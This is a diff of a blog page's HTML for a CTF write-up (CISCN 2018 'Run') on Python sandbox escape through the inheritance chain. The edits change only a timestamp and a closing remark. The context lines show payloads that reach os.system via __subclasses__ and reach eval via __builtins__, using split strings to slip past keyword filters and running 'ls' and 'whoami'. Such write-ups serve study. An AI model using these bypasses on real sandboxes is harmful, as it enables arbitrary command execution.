@@ -15,7 +15,7 @@
 <meta property="og:url" content="K4ngx.github.io/2018/04/30/ciscn2018/index.html">
 <meta property="og:site_name" content="K4ng&#39;s blog">
 <meta property="og:description" content="python继承链基础 __class__ 返回一个实例所属的类 __base__、__bases__ 返回一个类所直接继承的类 __subclasses 获取一个类的子类list __builtins__ 内置模块，包含了list、print等函数 __getattribute__() 通过传入字符串来进行方法的调用 __globals__ 返回一个当前空间下能使用的模块，方法和变量的字典。">
-<meta property="og:updated_time" content="2018-05-06T09:05:19.182Z">
+<meta property="og:updated_time" content="2018-05-06T09:08:07.884Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="国赛2018_Run_python继承链bypass">
 <meta name="twitter:description" content="python继承链基础 __class__ 返回一个实例所属的类 __base__、__bases__ 返回一个类所直接继承的类 __subclasses 获取一个类的子类list __builtins__ 内置模块，包含了list、print等函数 __getattribute__() 通过传入字符串来进行方法的调用 __globals__ 返回一个当前空间下能使用的模块，方法和变量的字典。">
@@ -216,7 +216,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># payload</span></div><div class="line">s = ().__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__getattribute__(<span class="string">'__global'</span>+<span class="string">'s__'</span>)[<span class="string">'o'</span>+<span class="string">'s'</span>].__getattribute__(<span class="string">'s'</span>+<span class="string">'ystem'</span>)</div><div class="line"><span class="comment"># 拿到了os.system函数，可执行任意命令</span></div><div class="line">s(<span class="string">'l'</span>+<span class="string">'s /home/ctf'</span>)</div></pre></td></tr></table></figure>
 <h2 id="py2和py3利用-builtins"><a href="#py2和py3利用-builtins" class="headerlink" title="py2和py3利用__builtins__"></a>py2和py3利用<code>__builtins__</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__builtins__.__getattribute__(<span class="string">'ev'</span>+<span class="string">'al'</span>)(<span class="string">'__import__("os").system("whoami")'</span>)</div></pre></td></tr></table></figure>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>他已经讲得很清楚了-&gt;<a href="https://xz.aliyun.com/t/2308" target="_blank" rel="external">用python继承链搞事情</a></p>
-<p>BTW：这次国赛的Web题。。一道空值，一道结合pwn，一道难死人= =</p>
+<p>BTW：这次国赛的Web题。。一道空值，一道结合pwn难爆，一道直接难爆= =</p>
 
       
 
